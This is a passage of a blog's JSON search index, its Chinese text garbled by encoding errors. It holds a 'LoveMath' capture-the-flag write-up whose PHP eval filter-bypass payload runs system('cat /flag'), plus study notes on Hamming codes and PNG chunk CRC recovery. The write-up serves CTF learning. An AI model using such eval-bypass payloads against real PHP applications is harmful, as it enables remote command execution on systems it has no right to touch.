\u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;base_convert\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39;, \u0026#39;dechex\u0026#39;, \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;expm1\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log1p\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;mt_srand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;]; preg_match_all(\u0026#39;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/\u0026#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\u0026#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°\u0026#34;); } } //å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval(\u0026#39;echo \u0026#39;.$content.\u0026#39;;\u0026#39;); } è§‚å¯Ÿä¸€ä¸‹åŸé¢˜\néœ€è¦ç»•è¿‡ä¸‰å¤„ï¼Œä¼ å‚é•¿åº¦ä¸è¶…è¿‡80ï¼Œç»•è¿‡$blacklistï¼Œåªä½¿ç”¨$whitelistä¸­çš„å­—æ®µ\nç†æƒ³çŠ¶æ€ä¸‹ï¼Œæ„é€ ?c=system('cat /flag')ä½†æ˜¯ç©ºæ ¼å·²ç»è¢«è¿‡æ»¤ï¼Œè€ƒè™‘ä¸Šæ–‡ä¸­çš„?c=$_GET['a']($_GET['b']);a=system\u0026amp;b=cat /flag\nå•å¼•å·å’ŒåŒå¼•å·è¢«è¿‡æ»¤ï¼Œä¸ä½¿ç”¨ä¹Ÿå¯ä»¥æ‰§è¡Œï¼ŒåŒæ—¶ï¼Œ[]å¯ä»¥ç”¨{}ä»£æ›¿\nåœ¨å¯¹å‚æ•°çš„æ£€æŸ¥ä¸­ï¼Œåªæ£€æŸ¥å˜é‡cï¼Œåˆ©ç”¨å·²æœ‰å‡½æ•°æ„å»ºpayload\nåˆ©ç”¨hex2binå‡½æ•°å°†æ•°å­—è½¬ä¸ºå­—ç¬¦ä¸²\né¦–å…ˆï¼Œæ„é€ hex2binå‡½æ•°\nbase_convert(37907361743,36,10) æ¥ç€ï¼Œæ„å»º_GETå­—æ®µ\nbase_convert(37907361743,36,10)(dechex(1598506324)) æ„å»ºå®Œæ•´payload\n?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pow}($$pi{log})\u0026amp;pow=system\u0026amp;log=cat /flag ","permalink":"https://fr000g.github.io/post/tech/lovemath-writeup/","summary":"LoveMath-writeup å‰ç½®çŸ¥è¯† å¯å˜å‡½æ•° PHP æ”¯æŒå¯å˜å‡½æ•°çš„æ¦‚å¿µã€‚è¿™æ„å‘³ç€å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHP å°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œå¹¶ä¸”å°è¯•æ‰§è¡Œå®ƒã€‚å¯å˜å‡½æ•°å¯ä»¥ç”¨æ¥","title":"LoveMath Writeup"},{"content":"å…³äºæµ·æ˜ç ç¼–ç æ–¹å¼çš„å­¦ä¹  å‰è¨€ æœºç»„è¯¾çš„æµ·æ˜ï¼ˆæ±‰æ˜ï¼‰ç å­¦çš„ä¸å¤ªè¡Œï¼Œè¯¾æœ¬ç›´æ¥ä¸æï¼Œè€å¸ˆè¯¾ä»¶å†…å®¹å’Œç»´åŸºç™¾ç§‘å’Œå„ç§åšå®¢éƒ½æœ‰äº›å‡ºå…¥ï¼Œé«˜ä½ä½ä½æ¢æ¥æ¢å»çš„ï¼Œæœ‰äº›è¿·ç³Šï¼Œé‡æ–°å­¦ä¹ ä¸€ä¸‹ï¼ˆæœ¬ç‰‡ä»¥ã€Šè®¡ç®—æœºç»„æˆåŸç†ã€‹å”æœ”é£ç‰ˆä¸ºä¸»ï¼‰\nç®€ä»‹ åœ¨ç”µä¿¡é¢†åŸŸä¸­ï¼Œæ±‰æ˜ç ï¼ˆè‹±è¯­ï¼šhamming codeï¼‰ï¼Œä¹Ÿç§°ä¸ºæµ·æ˜ç ï¼Œæ˜¯(7,4)æ±‰æ˜ç æ¨å¹¿å¾—åˆ°çš„ä¸€ç§çº¿æ€§çº é”™ç ï¼Œç”±ç†æŸ¥å¾·Â·å«æ–¯é‡ŒÂ·æ±‰æ˜äº1950å¹´å‘æ˜ã€‚\nç”¨æ•°å­¦æœ¯è¯­æ¥è¯´ï¼Œæ±‰æ˜ç æ˜¯ä¸€ç§äºŒå…ƒçº¿æ€§ç ã€‚å¯¹äºæ‰€æœ‰æ•´æ•° r â‰¥ 2ï¼Œå­˜åœ¨ä¸€ä¸ªåˆ†ç»„é•¿åº¦ n = 2r âˆ’ 1ã€k = 2r âˆ’ r âˆ’ 1 ç¼–ç ã€‚å› æ­¤æ±‰æ˜ç çš„ç ç‡ä¸º R = k / n = 1 âˆ’ r / (2r âˆ’ 1)ï¼Œå¯¹äºæœ€å°è·ç¦»ä¸º3ã€åˆ†ç»„é•¿åº¦ä¸º 2r âˆ’ 1 çš„ç æ¥è¯´æ˜¯æœ€é«˜çš„ã€‚æ±‰æ˜ç çš„å¥‡å¶æ£€éªŒçŸ©é˜µçš„æ˜¯é€šè¿‡åˆ—å‡ºæ‰€æœ‰é•¿åº¦ä¸º r çš„éé›¶åˆ—å‘é‡æ„æˆçš„ã€‚\næµ·æ˜ç æœ¬è´¨æ˜¯ä¸€ç§å¤šé‡å¥‡å¶æ ¡éªŒç ï¼Œå¯æ£€æµ‹ä»¥ä¸ºé”™è¯¯\nç¼–ç  ç¡®å®šæ ¡éªŒä½çš„ä¸ªæ•°\n2^k^ \u0026gt;= k+n+1\nå…¶ä¸­ï¼Œkä¸ºæ ¡éªŒä½çš„ä¸ªæ•°ï¼›nä¸ºåŸæ•°æ®ä½ä¸ªæ•°\nç¡®å®šæ ¡éªŒä½ç½®ï¼š2çš„å¹‚æ¬¡æ•°ï¼ˆ1ï¼Œ2ï¼Œ4ï¼Œ8â€¦â€¦ï¼‰\nè®¡ç®—æ ¡éªŒä½\nP1=D3$\\bigoplus$ D5$\\bigoplus$ D7\nP2=D3$\\bigoplus$ D6$\\bigoplus$ D7\nP4=D5$\\bigoplus$ D6$\\bigoplus$ D7\nï¼ˆç›´æ¥è®¡1çš„ä¸ªæ•°ï¼Œ1çš„ä¸ªæ•°ä¸ºå¥‡æ•°åˆ™ä¸º1ï¼Œä¸ªæ•°ä¸ºå¶æ•°åˆ™ä¸º0ï¼‰\nç¡®å®šå„ä¸ªæ ¡éªŒä½çš„æ£€æµ‹ä½æ•°ï¼š\nP1å¯ç†è§£ä¸ºå€’æ•°ç¬¬ä¸€ä½æ˜¯1çš„äºŒè¿›åˆ¶æ•°ï¼Œå¦‚112(3),1012(5),1112(7)\nP2ä¸ºå€’æ•°ç¬¬äºŒä½æ˜¯1çš„äºŒè¿›åˆ¶æ•°ï¼Œå¦‚112(3),1102(6),1112(7)\nP4ä½å€’æ•°ç¬¬ä¸‰ä½æ˜¯1çš„äºŒè¿›åˆ¶æ•°ï¼Œå¦‚1012(5),1102(6),1112(7)\né€šç”¨æ–¹æ³• å‚è§æ±‰æ˜ç  - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦ (wikipedia.org)\nä¾‹ å†™å‡º1100çš„æµ·æ˜ç \nç¡®å®škçš„ä½æ•°ã€‚n=4ï¼Œåˆ™k=3\nï¼ˆä¸ºäº†åº”è¯•ï¼Œç›´æ¥è®°åŸç ä¸æ ¡éªŒç ä½æ•°å…³ç³»1-\u0026gt;2ï¼›2~4-\u0026gt;3ï¼›5~11-\u0026gt;4ï¼‰\nç¡®å®šæ ¡éªŒç ä½ç½®ï¼Œå³1ï¼Œ2ï¼Œ4\nè®¡ç®—\nP1=1$\\bigoplus$1$\\bigoplus$0ï¼ˆ3ï¼Œ5ï¼Œ7ï¼‰\nP2=1$\\bigoplus$0$\\bigoplus$0ï¼ˆ3ï¼Œ6ï¼Œ7ï¼‰\nP3=1$\\bigoplus$0$\\bigoplus$0ï¼ˆ5ï¼Œ6ï¼Œ7ï¼‰\nå¾—P1=0 P2=1 P3=1\nåˆ™D4=0 D2=1 D1=1\nè¡¥å…¨\nä½ç½® D1 D2 D3 D4 D5 D6 D7 å€¼ 1 1 1 0 1 0 0 çº é”™ å®šä¹‰æ ¡éªŒä½Si\nS1=D1$\\bigoplus$D3$\\bigoplus$ D5$\\bigoplus$ D7\nS2=D2$\\bigoplus$D3$\\bigoplus$ D6$\\bigoplus$ D7\nS3=D4$\\bigoplus$D5$\\bigoplus$ D6$\\bigoplus$ D7\nè‹¥S3 S2 S1ä¸º000ï¼Œåˆ™æ— é”™è¯¯ï¼›è‹¥S3 S2 S1ä¸º001ï¼Œåˆ™ç¬¬ä¸€ä½é”™è¯¯ï¼ŒåŒç†å¦‚ä¸‹\nS3 S2 S1\t000\t001\t010\t011\t100\t101\t110\t111 é”™è¯¯ä½ç½®\tæ— \t1\t2\t3\t4\t5\t6\t7 æ£€æµ‹å‡ºé”™è¯¯ä½ç¿»è½¬å³å¯\n","permalink":"https://fr000g.github.io/post/tech/hamming/","summary":"å…³äºæµ·æ˜ç ç¼–ç æ–¹å¼çš„å­¦ä¹  å‰è¨€ æœºç»„è¯¾çš„æµ·æ˜ï¼ˆæ±‰æ˜ï¼‰ç å­¦çš„ä¸å¤ªè¡Œï¼Œè¯¾æœ¬ç›´æ¥ä¸æï¼Œè€å¸ˆè¯¾ä»¶å†…å®¹å’Œç»´åŸºç™¾ç§‘å’Œå„ç§åšå®¢éƒ½æœ‰äº›å‡ºå…¥ï¼Œé«˜ä½ä½ä½æ¢æ¥æ¢å»çš„ï¼Œ","title":"Hamming"},{"content":"å…³äºPNGæ–‡ä»¶çš„å­¦ä¹  æ–‡ä»¶æ ¼å¼ æ–‡ä»¶å¤´ 89 50 4E 47 0D 0A 1A 0A + æ•°æ®å— + æ•°æ®å— + æ•°æ®å—\næ•°æ®å—chunk PNGåˆä¸¤ç§æ•°æ®å—ï¼Œå…³é”®æ•°æ®å—ï¼ˆcritical chunkï¼‰ä¸è¾…åŠ©æ•°æ®å—ï¼ˆancillary chunksï¼‰ã€‚å…³é”®æ•°æ®å—å®šä¹‰4å„æ ‡å‡†æ•°æ®å—ï¼Œæ¯ä¸ªPNGæ–‡ä»¶éƒ½ä¸å¯ç¼ºå°‘\næ ‡å‡†æ•°æ®å—ä¸ºï¼šIHDR(æ–‡ä»¶å¤´æ•°æ®å—)ã€IDAT(å›¾è±¡æ•°æ®å—)ã€EIND(å›¾è±¡ç»“æŸæ•°æ®)\næ¯ä¸ªæ•°æ®å—ç”±4éƒ¨åˆ†ç»„æˆ\nåç§°\tå­—èŠ‚æ•°\tè¯´æ˜ length\t4\tæŒ‡å®šæ•°æ®é•¿åº¦ chunk type code\t4\tæŒ‡å®šæ•°æ®ç±»å‹ chunk data\tå¯å˜\tæ•°æ® CRC\t4\tæ ¡éªŒæ•°æ® IHDR åœ¨PNGæ•°æ®æµä¸­å”¯ä¸€ï¼Œå†…å®¹å…±13å­—èŠ‚ã€‚\nWidth: 4 bytes Height: 4 bytes Bit depth: 1 byte Color type: 1 byte Compression method: 1 byte Filter method: 1 byte Interlace method: 1 byte åé¢è·Ÿ4ä½CRCï¼ŒCRCç”±12-29ä½æ•°æ®è®¡ç®—å¾—å‡º CRC å¾ªç¯å†—ä½™æ ¡éªŒï¼ˆCyclic Redundancy Checkï¼Œ CRCï¼‰æ˜¯ä¸€ç§æ ¹æ®ç½‘ç»œæ•°æ®åŒ…æˆ–è®¡ç®—æœºæ–‡ä»¶ç­‰æ•°æ®äº§ç”Ÿç®€çŸ­å›ºå®šä½æ•°æ ¡éªŒç çš„ä¸€ç§ä¿¡é“ç¼–ç æŠ€æœ¯ï¼Œä¸»è¦ç”¨æ¥æ£€æµ‹æˆ–æ ¡éªŒæ•°æ®ä¼ è¾“æˆ–è€…ä¿å­˜åå¯èƒ½å‡ºç°çš„é”™è¯¯ã€‚å®ƒæ˜¯åˆ©ç”¨é™¤æ³•åŠä½™æ•°çš„åŸç†æ¥ä½œé”™è¯¯ä¾¦æµ‹çš„ã€‚\nå¸¸è§é¢˜ç›® é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„é«˜åº¦éšå†™ï¼Œå¯é€šè¿‡CRCæ ¡éªŒï¼Œè¿˜åŸå›¾ç‰‡\nEXP:\nimport os import binascii import struct misc = open(\u0026#34;img.png\u0026#34;, \u0026#34;rb\u0026#34;).read() for i in range(1920): data = misc[12:16] + struct.pack(\u0026#39;\u0026gt;i\u0026#39;, i) + misc[20:29]#éªŒè¯å®½åº¦ crc32 = binascii.crc32(data) \u0026amp; 0xffffffff if crc32 == 0x37EC2D65:#æ­¤å¤„ä¸ºCRC print(i) ä¸Šæ–‡ä¸­ï¼Œè‹¥éªŒè¯å›¾ç‰‡é«˜åº¦ï¼Œåˆ™ä»£ç ä¸º\ndata = misc[16:20] + struct.pack(\u0026#39;\u0026gt;i\u0026#39;, i) + misc[24:29] ","permalink":"https://fr000g.github.io/post/tech/png-file-format-learning/","summary":"å…³äºPNGæ–‡ä»¶çš„å­¦ä¹  æ–‡ä»¶æ ¼å¼ æ–‡ä»¶å¤´ 89 50 4E 47 0D 0A 1A 0A + æ•°æ®å— + æ•°æ®å— + æ•°æ®å— æ•°æ®å—chunk PNGåˆä¸¤ç§æ•°æ®å—ï¼Œå…³é”®æ•°æ®å—ï¼ˆcritical c","title":"PNG File Format Learning"}]